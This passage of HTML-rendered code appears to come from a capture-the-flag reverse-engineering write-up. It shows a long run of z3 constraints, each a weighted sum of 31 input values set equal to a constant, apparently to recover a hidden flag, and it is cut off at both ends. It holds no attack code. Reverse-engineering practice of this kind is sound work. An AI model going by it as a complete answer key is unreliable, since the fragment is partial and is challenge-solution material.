class="number">13</span>]+ <span class="number">200</span> * v4[<span class="number">12</span>]+ <span class="number">49</span> * v4[<span class="number">11</span>]+ <span class="number">119</span> * v4[<span class="number">10</span>]+ <span class="number">356</span> * v4[<span class="number">9</span>]+ <span class="number">398</span> * v4[<span class="number">8</span>]+ <span class="number">303</span> * v4[<span class="number">7</span>]+ <span class="number">224</span> * v4[<span class="number">6</span>]+ <span class="number">208</span> * v4[<span class="number">5</span>]+ <span class="number">244</span> * v4[<span class="number">4</span>]+ <span class="number">209</span> * v4[<span class="number">3</span>]+ <span class="number">189</span> * v4[<span class="number">2</span>]+ <span class="number">302</span> * v4[<span class="number">1</span>]+ <span class="number">395</span> * v4[<span class="number">0</span>]+ <span class="number">314</span> * v4[<span class="number">17</span>]+ <span class="number">13</span> * v4[<span class="number">18</span>]+ <span class="number">310</span> * v4[<span class="number">20</span>]+ <span class="number">21</span> * v4[<span class="number">21</span>]+ <span class="number">67</span> * v4[<span class="number">27</span>]+ <span class="number">127</span> * v4[<span class="number">28</span>]+ <span class="number">100</span> * v4[<span class="number">30</span>] == <span class="number">580384</span>)</span><br><span class="line">s.add(<span class="number">293</span> * v4[<span class="number">29</span>]+ <span class="number">343</span> * v4[<span class="number">28</span>]+ <span class="number">123</span> * v4[<span class="number">27</span>]+ <span class="number">387</span> * v4[<span class="number">26</span>]+ <span class="number">114</span> * v4[<span class="number">25</span>]+ <span class="number">303</span> * v4[<span class="number">24</span>]+ <span class="number">248</span> * v4[<span class="number">23</span>]+ <span class="number">258</span> * v4[<span class="number">21</span>]+ <span class="number">218</span> * v4[<span class="number">20</span>]+ <span class="number">180</span> * v4[<span class="number">19</span>]+ <span class="number">196</span> * v4[<span class="number">18</span>]+ <span class="number">398</span> * v4[<span class="number">17</span>]+ <span class="number">398</span> * v4[<span class="number">14</span>]+ <span class="number">138</span> * v4[<span class="number">9</span>]+ <span class="number">292</span> * v4[<span class="number">8</span>]+ <span class="number">38</span> * v4[<span class="number">7</span>]+ <span class="number">179</span> * v4[<span class="number">6</span>]+ <span class="number">190</span> * v4[<span class="number">5</span>]+ <span class="number">57</span> * v4[<span class="number">4</span>]+ <span class="number">358</span> * v4[<span class="number">3</span>]+ <span class="number">191</span> * v4[<span class="number">2</span>]+ <span class="number">215</span> * v4[<span class="number">1</span>]+ <span class="number">88</span> * v4[<span class="number">0</span>]+ <span class="number">22</span> * v4[<span class="number">10</span>]+ <span class="number">72</span> * v4[<span class="number">11</span>]+ <span class="number">357</span> * v4[<span class="number">12</span>]+ <span class="number">9</span> * v4[<span class="number">13</span>]+ <span class="number">389</span> * v4[<span class="number">15</span>]+ <span class="number">81</span> * v4[<span class="number">16</span>]+ <span class="number">85</span> * v4[<span class="number">30</span>] == <span class="number">529847</span>)</span><br><span class="line">s.add(<span class="number">311</span> * v4[<span class="number">29</span>]+ <span class="number">202</span> * v4[<span class="number">28</span>]+ <span class="number">234</span> * v4[<span class="number">27</span>]+ <span class="number">272</span> * v4[<span class="number">26</span>]+ <span class="number">55</span> * v4[<span class="number">25</span>]+ <span class="number">328</span> * v4[<span class="number">24</span>]+ <span class="number">246</span> * v4[<span class="number">23</span>]+ <span class="number">362</span> * v4[<span class="number">22</span>]+ <span class="number">86</span> * v4[<span class="number">21</span>]+ <span class="number">75</span> * v4[<span class="number">20</span>]+ <span class="number">142</span> * v4[<span class="number">17</span>]+ <span class="number">244</span> * v4[<span class="number">16</span>]+ <span class="number">216</span> * v4[<span class="number">15</span>]+ <span class="number">281</span> * v4[<span class="number">14</span>]+ <span class="number">398</span> * v4[<span class="number">13</span>]+ <span class="number">322</span> * v4[<span class="number">12</span>]+ <span class="number">251</span> * v4[<span class="number">11</span>]+ <span class="number">357</span> * v4[<span class="number">8</span>]+ <span class="number">76</span> * v4[<span class="number">7</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">389</span> * v4[<span class="number">5</span>]+ <span class="number">275</span> * v4[<span class="number">4</span>]+ <span class="number">312</span> * v4[<span class="number">3</span>]+ <span class="number">200</span> * v4[<span class="number">2</span>]+ <span class="number">110</span> * v4[<span class="number">1</span>]+ <span class="number">203</span> * v4[<span class="number">0</span>]+ <span class="number">99</span> * v4[<span class="number">9</span>]+ <span class="number">21</span> * v4[<span class="number">10</span>]+ <span class="number">269</span> * v4[<span class="number">18</span>]+ <span class="number">33</span> * v4[<span class="number">19</span>]+ <span class="number">356</span> * v4[<span class="number">30</span>] == <span class="number">631652</span>)</span><br><span class="line">s.add(<span class="number">261</span> * v4[<span class="number">29</span>]+ <span class="number">189</span> * v4[<span class="number">26</span>]+ <span class="number">55</span> * v4[<span class="number">25</span>]+ <span class="number">23</span> * v4[<span class="number">24</span>]+ <span class="number">202</span> * v4[<span class="number">23</span>]+ <span class="number">185</span> * v4[<span class="number">22</span>]+ <span class="number">182</span> * v4[<span class="number">21</span>]+ <span class="number">285</span> * v4[<span class="number">20</span>]+ <span class="number">217</span> * v4[<span class="number">17</span>]+ <span class="number">157</span> * v4[<span class="number">16</span>]+ <span class="number">232</span> * v4[<span class="number">15</span>]+ <span class="number">132</span> * v4[<span class="number">14</span>]+ <span class="number">169</span> * v4[<span class="number">13</span>]+ <span class="number">154</span> * v4[<span class="number">12</span>]+ <span class="number">121</span> * v4[<span class="number">11</span>]+ <span class="number">389</span> * v4[<span class="number">10</span>]+ <span class="number">376</span> * v4[<span class="number">9</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">225</span> * v4[<span class="number">5</span>]+ <span class="number">155</span> * v4[<span class="number">4</span>]+ <span class="number">234</span> * v4[<span class="number">3</span>]+ <span class="number">149</span> * v4[<span class="number">2</span>]+ <span class="number">241</span> * v4[<span class="number">1</span>]+ <span class="number">312</span> * v4[<span class="number">0</span>]+ <span class="number">368</span> * v4[<span class="number">7</span>]+ <span class="number">129</span> * v4[<span class="number">8</span>]+ <span class="number">226</span> * v4[<span class="number">18</span>]+ <span class="number">288</span> * v4[<span class="number">19</span>]+ <span class="number">201</span> * v4[<span class="number">27</span>]+ <span class="number">288</span> * v4[<span class="number">28</span>]+ <span class="number">69</span> * v4[<span class="number">30</span>] == <span class="number">614840</span>)</span><br><span class="line">s.add(<span class="number">60</span> * v4[<span class="number">29</span>]+ <span class="number">118</span> * v4[<span class="number">28</span>]+ <span class="number">153</span> * v4[<span class="number">27</span>]+ <span class="number">139</span> * v4[<span class="number">26</span>]+ <span class="number">23</span> * v4[<span class="number">25</span>]+ <span class="number">279</span> * v4[<span class="number">24</span>]+ <span class="number">396</span> * v4[<span class="number">23</span>]+ <span class="number">287</span> * v4[<span class="number">22</span>]+ <span class="number">237</span> * v4[<span class="number">19</span>]+ <span class="number">266</span> * v4[<span class="number">18</span>]+ <span class="number">149</span> * v4[<span class="number">17</span>]+ <span class="number">193</span> * v4[<span class="number">16</span>]+ <span class="number">395</span> * v4[<span class="number">15</span>]+ <span class="number">97</span> * v4[<span class="number">14</span>]+ <span class="number">16</span> * v4[<span class="number">13</span>]+ <span class="number">286</span> * v4[<span class="number">12</span>]+ <span class="number">105</span> * v4[<span class="number">11</span>]+ <span class="number">88</span> * v4[<span class="number">10</span>]+ <span class="number">282</span> * v4[<span class="number">9</span>]+ <span class="number">55</span> * v4[<span class="number">8</span>]+ <span class="number">134</span> * v4[<span class="number">7</span>]+ <span class="number">114</span> * v4[<span class="number">6</span>]+ <span class="number">101</span> * v4[<span class="number">5</span>]+ <span class="number">116</span> * v4[<span class="number">4</span>]+ <span class="number">271</span> * v4[<span class="number">3</span>]+ <span class="number">186</span> * v4[<span class="number">2</span>]+ <span class="number">263</span> * v4[<span class="number">1</span>]+ <span class="number">313</span> * v4[<span class="number">0</span>]+ <span class="number">149</span> * v4[<span class="number">20</span>]+ <span class="number">129</span> * v4[<span class="number">21</span>]+ <span class="number">145</span> * v4[<span class="number">30</span>] == <span class="number">510398</span>)</span><br><span class="line">s.add(<span class="number">385</span> * v4[<span class="number">29</span>]+ <span class="number">53</span> * v4[<span class="number">28</span>]+ <span class="number">112</span> * v4[<span class="number">27</span>]+ <span class="number">8</span> * v4[<span class="number">26</span>]+ <span class="number">232</span> * v4[<span class="number">25</span>]+ <span class="number">145</span> * v4[<span class="number">24</span>]+ <span class="number">313</span> * v4[<span class="number">23</span>]+ <span class="number">156</span> * v4[<span class="number">22</span>]+ <span class="number">321</span> * v4[<span class="number">21</span>]+ <span class="number">358</span> * v4[<span class="number">20</span>]+ <span class="number">46</span> * v4[<span class="number">19</span>]+ <span class="number">382</span> * v4[<span class="number">18</span>]+ <span class="number">144</span> * v4[<span class="number">16</span>]+ <span class="number">222</span> * v4[<span class="number">14</span>]+ <span class="number">329</span> * v4[<span class="number">13</span>]+ <span class="number">161</span> * v4[<span class="number">12</span>]+ <span class="number">335</span> * v4[<span class="number">11</span>]+ <span class="number">50</span> * v4[<span class="number">10</span>]+ <span class="number">373</span> * v4[<span class="number">9</span>]+ <span class="number">66</span> * v4[<span class="number">8</span>]+ <span class="number">44</span> * v4[<span class="number">7</span>]+ <span class="number">59</span> * v4[<span class="number">6</span>]+ <span class="number">292</span> * v4[<span class="number">5</span>]+ <span class="number">39</span> * v4[<span class="number">4</span>]+ <span class="number">53</span> * v4[<span class="number">3</span>]+ <span class="number">310</span> * v4[<span class="number">0</span>]+ <span class="number">154</span> * v4[<span class="number">1</span>]+ <span class="number">24</span> * v4[<span class="number">2</span>]+ <span class="number">396</span> * v4[<span class="number">15</span>]+ <span class="number">81</span> * v4[<span class="number">17</span>]+ <span class="number">355</span> * v4[<span class="number">30</span>] == <span class="number">558740</span>)</span><br><span class="line">s.add(<span class="number">249</span> * v4[<span class="number">29</span>]+ <span class="number">386</span> * v4[<span class="number">28</span>]+ <span class="number">313</span> * v4[<span class="number">27</span>]+ <span class="number">74</span> * v4[<span class="number">26</span>]+ <span class="number">22</span> * v4[<span class="number">25</span>]+ <span class="number">168</span> * v4[<span class="number">24</span>]+ <span class="number">305</span> * v4[<span class="number">21</span>]+ <span class="number">358</span> * v4[<span class="number">20</span>]+ <span class="number">191</span> * v4[<span class="number">19</span>]+ <span class="number">202</span> * v4[<span class="number">18</span>]+ <span class="number">14</span> * v4[<span class="number">15</span>]+ <span class="number">114</span> * v4[<span class="number">14</span>]+ <span class="number">224</span> * v4[<span class="number">13</span>]+ <span class="number">134</span> * v4[<span class="number">12</span>]+ <span class="number">274</span> * v4[<span class="number">11</span>]+ <span class="number">372</span> * v4[<span class="number">10</span>]+ <span class="number">159</span> * v4[<span class="number">9</span>]+ <span class="number">233</span> * v4[<span class="number">8</span>]+ <span class="number">70</span> * v4[<span class="number">7</span>]+ <span class="number">287</span> * v4[<span class="number">6</span>]+ <span class="number">297</span> * v4[<span class="number">5</span>]+ <span class="number">318</span> * v4[<span class="number">4</span>]+ <span class="number">177</span> * v4[<span class="number">3</span>]+ <span class="number">173</span> * v4[<span class="number">2</span>]+ <span class="number">270</span> * v4[<span class="number">1</span>]+ <span class="number">163</span> * v4[<span class="number">0</span>]+ <span class="number">77</span> * v4[<span class="number">16</span>]+ <span class="number">25</span> * v4[<span class="number">17</span>]+ <span class="number">387</span> * v4[<span class="number">22</span>]+ <span class="number">18</span> * v4[<span class="number">23</span>]+ <span class="number">345</span> * v4[<span class="number">30</span>] == <span class="number">592365</span>)</span><br><span class="line">s.add(<span class="number">392</span> * v4[<span class="number">29</span>]+ <span class="number">385</span> * v4[<span class="number">28</span>]+ <span class="number">302</span> * v4[<span class="number">27</span>]+ <span class="number">13</span> * v4[<span class="number">25</span>]+ <span class="number">27</span> * v4[<span class="number">24</span>]+ <span class="number">99</span> * v4[<span class="number">22</span>]+ <span class="number">343</span> * v4[<span class="number">19</span>]+ <span class="number">324</span> * v4[<span class="number">18</span>]+ <span class="number">223</span> * v4[<span class="number">17</span>]+ <span class="number">372</span> * v4[<span class="number">16</span>]+ <span class="number">261</span> * v4[<span class="number">15</span>]+ <span class="number">181</span> * v4[<span class="number">14</span>]+ <span class="number">203</span> * v4[<span class="number">13</span>]+ <span class="number">232</span> * v4[<span class="number">12</span>]+ <span class="number">305</span> * v4[<span class="number">11</span>]+ <span class="number">393</span> * v4[<span class="number">10</span>]+ <span class="number">325</span> * v4[<span class="number">9</span>]+ <span class="number">231</span> * v4[<span class="number">8</span>]+ <span class="number">92</span> * v4[<span class="number">7</span>]+ <span class="number">142</span> * v4[<span class="number">6</span>]+ <span class="number">22</span> * v4[<span class="number">5</span>]+ <span class="number">86</span> * v4[<span class="number">4</span>]+ <span class="number">264</span> * v4[<span class="number">3</span>]+ <span class="number">300</span> * v4[<span class="number">2</span>]+ <span class="number">387</span> * v4[<span class="number">1</span>]+ <span class="number">360</span> * v4[<span class="number">0</span>]+ <span class="number">225</span> * v4[<span class="number">20</span>]+ <span class="number">127</span> * v4[<span class="number">21</span>]+ <span class="number">2</span> * v4[<span class="number">23</span>]+ <span class="number">80</span> * v4[<span class="number">26</span>]+ <span class="number">268</span> * v4[<span class="number">30</span>] == <span class="number">619574</span>)</span><br><span class="line">s.add(<span class="number">270</span> * v4[<span class="number">28</span>]+ <span class="number">370</span> * v4[<span class="number">27</span>]+ <span class="number">235</span> * v4[<span class="number">26</span>]+ <span class="number">96</span> * v4[<span class="number">22</span>]+ <span class="number">85</span> * v4[<span class="number">20</span>]+ <span class="number">150</span> * v4[<span class="number">19</span>]+ <span class="number">140</span> * v4[<span class="number">18</span>]+ <span class="number">94</span> * v4[<span class="number">17</span>]+ <span class="number">295</span> * v4[<span class="number">16</span>]+ <span class="number">19</span> * v4[<span class="number">14</span>]+ <span class="number">176</span> * v4[<span class="number">12</span>]+ <span class="number">94</span> * v4[<span class="number">11</span>]+ <span class="number">258</span> * v4[<span class="number">10</span>]+ <span class="number">302</span> * v4[<span class="number">9</span>]+ <span class="number">171</span> * v4[<span class="number">8</span>]+ <span class="number">66</span> * v4[<span class="number">7</span>]+ <span class="number">278</span> * v4[<span class="number">6</span>]+ <span class="number">193</span> * v4[<span class="number">5</span>]+ <span class="number">251</span> * v4[<span class="number">4</span>]+ <span class="number">284</span> * v4[<span class="number">3</span>]+ <span class="number">218</span> * v4[<span class="number">2</span>]+ (v4[<span class="number">1</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">319</span> * v4[<span class="number">0</span>]+ <span class="number">125</span> * v4[<span class="number">13</span>]+ <span class="number">24</span> * v4[<span class="number">15</span>]+ <span class="number">267</span> * v4[<span class="number">21</span>]+ <span class="number">160</span> * v4[<span class="number">23</span>]+ <span class="number">111</span> * v4[<span class="number">24</span>]+ <span class="number">33</span> * v4[<span class="number">25</span>]+ <span class="number">174</span> * v4[<span class="number">29</span>]+ <span class="number">13</span> * v4[<span class="number">30</span>] == <span class="number">480557</span>)</span><br><span class="line">s.add(<span class="number">87</span> * v4[<span class="number">28</span>]+ <span class="number">260</span> * v4[<span class="number">27</span>]+ <span class="number">326</span> * v4[<span class="number">26</span>]+ <span class="number">210</span> * v4[<span class="number">25</span>]+ <span class="number">357</span> * v4[<span class="number">24</span>]+ <span class="number">170</span> * v4[<span class="number">23</span>]+ <span class="number">315</span> * v4[<span class="number">22</span>]+ <span class="number">376</span> * v4[<span class="number">21</span>]+ <span class="number">227</span> * v4[<span class="number">20</span>]+ <span class="number">43</span> * v4[<span class="number">19</span>]+ <span class="number">358</span> * v4[<span class="number">18</span>]+ <span class="number">364</span> * v4[<span class="number">17</span>]+ <span class="number">309</span> * v4[<span class="number">16</span>]+ <span class="number">282</span> * v4[<span class="number">15</span>]+ <span class="number">286</span> * v4[<span class="number">14</span>]+ <span class="number">365</span> * v4[<span class="number">13</span>]+ <span class="number">287</span> * v4[<span class="number">12</span>]+ <span class="number">377</span> * v4[<span class="number">11</span>]+ <span class="number">74</span> * v4[<span class="number">10</span>]+ <span class="number">225</span> * v4[<span class="number">9</span>]+ <span class="number">328</span> * v4[<span class="number">6</span>]+ <span class="number">223</span> * v4[<span class="number">5</span>]+ <span class="number">120</span> * v4[<span class="number">4</span>]+ <span class="number">102</span> * v4[<span class="number">3</span>]+ <span class="number">162</span> * v4[<span class="number">2</span>]+ <span class="number">123</span> * v4[<span class="number">1</span>]+ <span class="number">196</span> * v4[<span class="number">0</span>]+ <span class="number">29</span> * v4[<span class="number">7</span>]+ <span class="number">27</span> * v4[<span class="number">8</span>]+ <span class="number">352</span> * v4[<span class="number">30</span>] == <span class="number">666967</span>)</span><br><span class="line">s.add(<span class="number">61</span> * v4[<span class="number">29</span>]+ <span class="number">195</span> * v4[<span class="number">28</span>]+ <span class="number">125</span> * v4[<span class="number">27</span>]+ (v4[<span class="number">26</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">260</span> * v4[<span class="number">25</span>]+ <span class="number">202</span> * v4[<span class="number">24</span>]+ <span class="number">116</span> * v4[<span class="number">23</span>]+ <span class="number">230</span> * v4[<span class="number">22</span>]+ <span class="number">326</span> * v4[<span class="number">21</span>]+ <span class="number">211</span> * v4[<span class="number">20</span>]+ <span class="number">371</span> * v4[<span class="number">19</span>]+ <span class="number">353</span> * v4[<span class="number">16</span>]+ <span class="number">124</span> * v4[<span class="number">13</span>]+ <span class="number">188</span> * v4[<span class="number">12</span>]+ <span class="number">163</span> * v4[<span class="number">11</span>]+ <span class="number">140</span> * v4[<span class="number">10</span>]+ <span class="number">51</span> * v4[<span class="number">9</span>]+ <span class="number">262</span> * v4[<span class="number">8</span>]+ <span class="number">229</span> * v4[<span class="number">7</span>]+ <span class="number">100</span> * v4[<span class="number">6</span>]+ <span class="number">113</span> * v4[<span class="number">5</span>]+ <span class="number">158</span> * v4[<span class="number">4</span>]+ <span class="number">378</span> * v4[<span class="number">3</span>]+ <span class="number">365</span> * v4[<span class="number">2</span>]+ <span class="number">207</span> * v4[<span class="number">1</span>]+ <span class="number">277</span> * v4[<span class="number">0</span>]+ <span class="number">190</span> * v4[<span class="number">14</span>]+ <span class="number">320</span> * v4[<span class="number">15</span>]+ <span class="number">347</span> * v4[<span class="number">17</span>]+ <span class="number">11</span> * v4[<span class="number">18</span>]+ <span class="number">137</span> * v4[<span class="number">30</span>] == <span class="number">590534</span>)</span><br><span class="line">s.add(<span class="number">39</span> * v4[<span class="number">28</span>]+ <span class="number">303</span> * v4[<span class="number">27</span>]+ <span class="number">360</span> * v4[<span class="number">26</span>]+ <span class="number">157</span> * v4[<span class="number">25</span>]+ <span class="number">324</span> * v4[<span class="number">24</span>]+ <span class="number">77</span> * v4[<span class="number">23</span>]+ <span class="number">308</span> * v4[<span class="number">22</span>]+ <span class="number">313</span> * v4[<span class="number">21</span>]+ <span class="number">87</span> * v4[<span class="number">20</span>]+ <span class="number">201</span> * v4[<span class="number">19</span>]+ <span class="number">50</span> * v4[<span class="number">18</span>]+ <span class="number">60</span> * v4[<span class="number">17</span>]+ <span class="number">28</span> * v4[<span class="number">16</span>]+ <span class="number">193</span> * v4[<span class="number">15</span>]+ <span class="number">184</span> * v4[<span class="number">14</span>]+ <span class="number">205</span> * v4[<span class="number">13</span>]+ <span class="number">140</span> * v4[<span class="number">12</span>]+ <span class="number">311</span> * v4[<span class="number">11</span>]+ <span class="number">304</span> * v4[<span class="number">10</span>]+ <span class="number">35</span> * v4[<span class="number">9</span>]+ <span class="number">356</span> * v4[<span class="number">8</span>]+ <span class="number">23</span> * v4[<span class="number">5</span>]+ <span class="number">85</span> * v4[<span class="number">4</span>]+ <span class="number">156</span> * v4[<span class="number">3</span>]+ <span class="number">16</span> * v4[<span class="number">2</span>]+ <span class="number">26</span> * v4[<span class="number">1</span>]+ <span class="number">157</span> * v4[<span class="number">0</span>]+ <span class="number">150</span> * v4[<span class="number">6</span>]+ <span class="number">72</span> * v4[<span class="number">7</span>]+ <span class="number">58</span> * v4[<span class="number">29</span>] == <span class="number">429108</span>)</span><br><span class="line">s.add(<span class="number">157</span> * v4[<span class="number">29</span>]+ <span class="number">137</span> * v4[<span class="number">28</span>]+ <span class="number">71</span> * v4[<span class="number">27</span>]+ <span class="number">269</span> * v4[<span class="number">26</span>]+ <span class="number">161</span> * v4[<span class="number">25</span>]+ <span class="number">317</span> * v4[<span class="number">20</span>]+ <span class="number">296</span> * v4[<span class="number">19</span>]+ <span class="number">385</span> * v4[<span class="number">18</span>]+ <span class="number">165</span> * v4[<span class="number">13</span>]+ <span class="number">159</span> * v4[<span class="number">12</span>]+ <span class="number">132</span> * v4[<span class="number">11</span>]+ <span class="number">296</span> * v4[<span class="number">10</span>]+ <span class="number">162</span> * v4[<span class="number">7</span>]+ <span class="number">254</span> * v4[<span class="number">4</span>]+ <span class="number">172</span> * v4[<span class="number">3</span>]+ <span class="number">132</span> * v4[<span class="number">0</span>]+ <span class="number">369</span> * v4[<span class="number">1</span>]+ <span class="number">257</span> * v4[<span class="number">2</span>]+ <span class="number">134</span> * v4[<span class="number">5</span>]+ <span class="number">384</span> * v4[<span class="number">6</span>]+ <span class="number">53</span> * v4[<span class="number">8</span>]+ <span class="number">255</span> * v4[<span class="number">9</span>]+ <span class="number">229</span> * v4[<span class="number">14</span>]+ <span class="number">129</span> * v4[<span class="number">15</span>]+ <span class="number">23</span> * v4[<span class="number">16</span>]+ <span class="number">41</span> * v4[<span class="number">17</span>]+ <span class="number">112</span> * v4[<span class="number">21</span>]+ <span class="number">17</span> * v4[<span class="number">22</span>]+ <span class="number">222</span> * v4[<span class="number">23</span>]+ <span class="number">96</span> * v4[<span class="number">24</span>]+ <span class="number">126</span> * v4[<span class="number">30</span>] == <span class="number">563521</span>)</span><br><span class="line">s.add(<span class="number">207</span> * v4[<span class="number">29</span>]+ <span class="number">83</span> * v4[<span class="number">28</span>]+ <span class="number">111</span> * v4[<span class="number">27</span>]+ <span class="number">35</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">25</span>]+ <span class="number">138</span> * v4[<span class="number">22</span>]+ <span class="number">223</span> * v4[<span class="number">21</span>]+ <span class="number">142</span> * v4[<span class="number">20</span>]+ <span class="number">154</span> * v4[<span class="number">19</span>]+ <span class="number">111</span> * v4[<span class="number">18</span>]+ <span class="number">341</span> * v4[<span class="number">17</span>]+ <span class="number">175</span> * v4[<span class="number">16</span>]+ <span class="number">259</span> * v4[<span class="number">15</span>]+ <span class="number">225</span> * v4[<span class="number">14</span>]+ <span class="number">26</span> * v4[<span class="number">11</span>]+ <span class="number">334</span> * v4[<span class="number">10</span>]+ <span class="number">250</span> * v4[<span class="number">7</span>]+ <span class="number">198</span> * v4[<span class="number">6</span>]+ <span class="number">279</span> * v4[<span class="number">5</span>]+ <span class="number">301</span> * v4[<span class="number">4</span>]+ <span class="number">193</span> * v4[<span class="number">3</span>]+ <span class="number">334</span> * v4[<span class="number">2</span>]+ <span class="number">134</span> * v4[<span class="number">0</span>]+ <span class="number">37</span> * v4[<span class="number">1</span>]+ <span class="number">183</span> * v4[<span class="number">8</span>]+ <span class="number">5</span> * v4[<span class="number">9</span>]+ <span class="number">270</span> * v4[<span class="number">12</span>]+ <span class="number">21</span> * v4[<span class="number">13</span>]+ <span class="number">275</span> * v4[<span class="number">23</span>]+ <span class="number">48</span> * v4[<span class="number">24</span>]+ <span class="number">163</span> * v4[<span class="number">30</span>] == <span class="number">493999</span>)</span><br><span class="line">s.add(<span class="number">393</span> * v4[<span class="number">29</span>]+ <span class="number">176</span> * v4[<span class="number">28</span>]+ <span class="number">105</span> * v4[<span class="number">27</span>]+ <span class="number">162</span> * v4[<span class="number">26</span>]+ <span class="number">148</span> * v4[<span class="number">25</span>]+ <span class="number">281</span> * v4[<span class="number">24</span>]+ <span class="number">300</span> * v4[<span class="number">23</span>]+ <span class="number">342</span> * v4[<span class="number">18</span>]+ <span class="number">262</span> * v4[<span class="number">17</span>]+ <span class="number">152</span> * v4[<span class="number">12</span>]+ <span class="number">43</span> * v4[<span class="number">11</span>]+ <span class="number">296</span> * v4[<span class="number">10</span>]+ <span class="number">273</span> * v4[<span class="number">9</span>]+ <span class="number">75</span> * v4[<span class="number">6</span>]+ <span class="number">18</span> * v4[<span class="number">4</span>]+ <span class="number">217</span> * v4[<span class="number">2</span>]+ <span class="number">132</span> * v4[<span class="number">1</span>]+ <span class="number">112</span> * v4[<span class="number">0</span>]+ <span class="number">210</span> * v4[<span class="number">3</span>]+ <span class="number">72</span> * v4[<span class="number">5</span>]+ <span class="number">113</span> * v4[<span class="number">7</span>]+ <span class="number">40</span> * v4[<span class="number">8</span>]+ <span class="number">278</span> * v4[<span class="number">13</span>]+ <span class="number">24</span> * v4[<span class="number">14</span>]+ <span class="number">77</span> * v4[<span class="number">15</span>]+ <span class="number">11</span> * v4[<span class="number">16</span>]+ <span class="number">55</span> * v4[<span class="number">19</span>]+ <span class="number">255</span> * v4[<span class="number">20</span>]+ <span class="number">241</span> * v4[<span class="number">21</span>]+ <span class="number">13</span> * v4[<span class="number">22</span>]+ <span class="number">356</span> * v4[<span class="number">30</span>] == <span class="number">470065</span>)</span><br><span class="line">s.add(<span class="number">369</span> * v4[<span class="number">29</span>]+ <span class="number">231</span> * v4[<span class="number">28</span>]+ <span class="number">285</span> * v4[<span class="number">25</span>]+ <span class="number">290</span> * v4[<span class="number">24</span>]+ <span class="number">297</span> * v4[<span class="number">23</span>]+ <span class="number">189</span> * v4[<span class="number">22</span>]+ <span class="number">390</span> * v4[<span class="number">21</span>]+ <span class="number">345</span> * v4[<span class="number">20</span>]+ <span class="number">153</span> * v4[<span class="number">19</span>]+ <span class="number">114</span> * v4[<span class="number">18</span>]+ <span class="number">251</span> * v4[<span class="number">17</span>]+ <span class="number">340</span> * v4[<span class="number">16</span>]+ <span class="number">44</span> * v4[<span class="number">15</span>]+ <span class="number">58</span> * v4[<span class="number">14</span>]+ <span class="number">335</span> * v4[<span class="number">13</span>]+ <span class="number">359</span> * v4[<span class="number">12</span>]+ <span class="number">392</span> * v4[<span class="number">11</span>]+ <span class="number">181</span> * v4[<span class="number">8</span>]+ <span class="number">103</span> * v4[<span class="number">7</span>]+ <span class="number">229</span> * v4[<span class="number">6</span>]+ <span class="number">175</span> * v4[<span class="number">5</span>]+ <span class="number">208</span> * v4[<span class="number">4</span>]+ <span class="number">92</span> * v4[<span class="number">3</span>]+ <span class="number">397</span> * v4[<span class="number">2</span>]+ <span class="number">349</span> * v4[<span class="number">1</span>]+ <span class="number">356</span> * v4[<span class="number">0</span>]+ (v4[<span class="number">9</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">5</span> * v4[<span class="number">10</span>]+ <span class="number">88</span> * v4[<span class="number">26</span>]+ <span class="number">40</span> * v4[<span class="number">27</span>]+ <span class="number">295</span> * v4[<span class="number">30</span>] == <span class="number">661276</span>)</span><br><span class="line">s.add(<span class="number">341</span> * v4[<span class="number">27</span>]+ <span class="number">40</span> * v4[<span class="number">25</span>]+ <span class="number">374</span> * v4[<span class="number">23</span>]+ <span class="number">201</span> * v4[<span class="number">22</span>]+ <span class="number">77</span> * v4[<span class="number">21</span>]+ <span class="number">215</span> * v4[<span class="number">20</span>]+ <span class="number">283</span> * v4[<span class="number">19</span>]+ <span class="number">213</span> * v4[<span class="number">18</span>]+ <span class="number">392</span> * v4[<span class="number">17</span>]+ <span class="number">224</span> * v4[<span class="number">16</span>]+ v4[<span class="number">15</span>]+ <span class="number">270</span> * v4[<span class="number">12</span>]+ <span class="number">28</span> * v4[<span class="number">11</span>]+ <span class="number">75</span> * v4[<span class="number">8</span>]+ <span class="number">386</span> * v4[<span class="number">7</span>]+ <span class="number">298</span> * v4[<span class="number">6</span>]+ <span class="number">170</span> * v4[<span class="number">5</span>]+ <span class="number">287</span> * v4[<span class="number">4</span>]+ <span class="number">247</span> * v4[<span class="number">3</span>]+ <span class="number">204</span> * v4[<span class="number">2</span>]+ <span class="number">103</span> * v4[<span class="number">1</span>]+ <span class="number">21</span> * v4[<span class="number">0</span>]+ <span class="number">84</span> * v4[<span class="number">9</span>]+ <span class="number">27</span> * v4[<span class="number">10</span>]+ <span class="number">159</span> * v4[<span class="number">13</span>]+ <span class="number">192</span> * v4[<span class="number">14</span>]+ <span class="number">213</span> * v4[<span class="number">24</span>]+ <span class="number">129</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">28</span>]+ <span class="number">27</span> * v4[<span class="number">29</span>]+ <span class="number">361</span> * v4[<span class="number">30</span>] == <span class="number">555288</span>)</span><br><span class="line">s.add(<span class="number">106</span> * v4[<span class="number">29</span>]+ <span class="number">363</span> * v4[<span class="number">28</span>]+ <span class="number">210</span> * v4[<span class="number">27</span>]+ <span class="number">171</span> * v4[<span class="number">26</span>]+ <span class="number">289</span> * v4[<span class="number">25</span>]+ <span class="number">240</span> * v4[<span class="number">24</span>]+ <span class="number">164</span> * v4[<span class="number">23</span>]+ <span class="number">342</span> * v4[<span class="number">22</span>]+ <span class="number">391</span> * v4[<span class="number">19</span>]+ <span class="number">304</span> * v4[<span class="number">18</span>]+ <span class="number">218</span> * v4[<span class="number">17</span>]+ <span class="number">32</span> * v4[<span class="number">16</span>]+ <span class="number">350</span> * v4[<span class="number">15</span>]+ <span class="number">339</span> * v4[<span class="number">12</span>]+ <span class="number">303</span> * v4[<span class="number">11</span>]+ <span class="number">222</span> * v4[<span class="number">10</span>]+ <span class="number">298</span> * v4[<span class="number">9</span>]+ <span class="number">47</span> * v4[<span class="number">8</span>]+ <span class="number">48</span> * v4[<span class="number">6</span>]+ <span class="number">264</span> * v4[<span class="number">4</span>]+ <span class="number">113</span> * v4[<span class="number">3</span>]+ <span class="number">275</span> * v4[<span class="number">2</span>]+ <span class="number">345</span> * v4[<span class="number">1</span>]+ <span class="number">312</span> * v4[<span class="number">0</span>]+ <span class="number">171</span> * v4[<span class="number">5</span>]+ <span 